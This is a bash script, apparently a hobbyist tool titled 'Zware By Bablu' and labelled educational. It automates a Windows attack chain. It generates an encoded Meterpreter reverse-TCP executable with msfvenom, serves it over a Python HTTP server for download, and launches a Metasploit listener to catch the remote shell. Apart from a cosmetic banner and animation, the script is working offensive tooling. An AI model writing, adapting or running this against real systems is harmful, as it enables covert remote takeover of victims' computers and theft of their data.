#!/bin/bash

# A simple script to automate payload creation and listener setup for educational purposes.

# Prerequisite check for figlet
if ! command -v figlet &> /dev/null
then
    echo "Figlet could not be found. Please install it to continue."
    echo "Run: sudo apt-get update && sudo apt-get install figlet"
    exit
fi

# --- Custom Hacker Animation Function ---
hacker_effect() {
    echo "[*] Initializing process... running diagnostics..."
    sleep 2
    # Set text color to green
    tput setaf 2
    # Character set for the animation
    chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()[]{}"
    # Get terminal dimensions
    width=$(tput cols)
    # Run the animation for 5 seconds
    end_time=$((SECONDS+5))
    while [ $SECONDS -lt $end_time ]; do
        # Generate a line of random characters
        line=""
        for ((i=0; i<$width; i++)); do
            line+="${chars:RANDOM%${#chars}:1}"
        done
        echo "$line"
        sleep 0.05
    done
    # Reset terminal colors
    tput sgr0
    echo "[✔] Diagnostics complete."
}


# --- Main Script ---
clear
# --- Banner ---
echo "============================================================"
figlet "Zware By Bablu"
echo "============================================================"
echo ""

# --- User Input ---
read -p "[+] Enter LHOST (Your Kali IP): " LHOST
read -p "[+] Enter LPORT (e.g., 4444): " LPORT
read -p "[+] Enter the desired payload name (without .exe): " FILENAME

# Add the .exe extension
FULL_FILENAME="${FILENAME}.exe"

# --- Run Custom Animation ---
echo ""
hacker_effect

# --- Payload Generation ---
echo ""
echo "[*] Generating payload... Please wait."

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a x64 --platform windows -e x64/xor -i 5 -f exe -o $FULL_FILENAME

# --- Confirmation Banner & Server Launch ---
if [ -f "$FULL_FILENAME" ]; then
    echo ""
    figlet "Payload Ready"
    echo "    A tool by Md Khairul Islam Bablu"
    echo "============================================================"
    echo ""
    echo "[*] Starting Python HTTP server in a new terminal tab..."
    # This command opens a new tab and starts the server. 
    # Note: This is for gnome-terminal, which is common on Kali.
    gnome-terminal --tab -- bash -c "echo '[*] Serving payload from this directory on port 8080...'; echo '[*] Press Ctrl+C to stop the server.'; python3 -m http.server 8080; exec bash"
    sleep 2
else
    echo "[!] Payload generation failed. Aborting."
    exit 1
fi

# --- Listener Setup ---
echo "[*] Creating listener resource file..."
cat > listener.rc << EOF
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
run
EOF

echo "[*] Starting Metasploit listener in this tab..."
msfconsole -r listener.rc

# --- Final Messages ---
echo ""
echo "============================================================"
echo "[✔] Session closed."
echo "[✔] A Tool by Md Khairul Islam Bablu"
echo "============================================================"

# Clean up the resource file
rm listener.rc
